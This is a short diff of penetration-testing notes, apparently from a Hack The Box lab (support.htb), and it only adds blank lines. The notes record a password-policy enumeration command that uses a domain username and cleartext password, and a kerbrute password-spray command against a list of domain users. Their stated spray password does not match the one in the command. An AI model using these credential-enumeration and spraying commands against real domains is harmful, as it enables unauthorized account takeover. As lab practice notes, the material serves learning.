@@ -1,5 +1,6 @@
 # Password policy enumeration
 can we brute?
+
 ```$ python enum_policy.py support.htb 'support\support' 'Ironside437pleasure401Watchful'```
 ```
 ##################################
@@ -16,6 +17,7 @@ modifiedCount: [b'1']
 ```
 # Password Spray
 Trying 'Aa123456' against all domain users.
+
 ```$ kerbrute passwordspray -d support.htb --dc 10.10.11.174 loot/users.txt 'Ironside437pleasure401Watchful'```
 
 ```loot/users.txt```
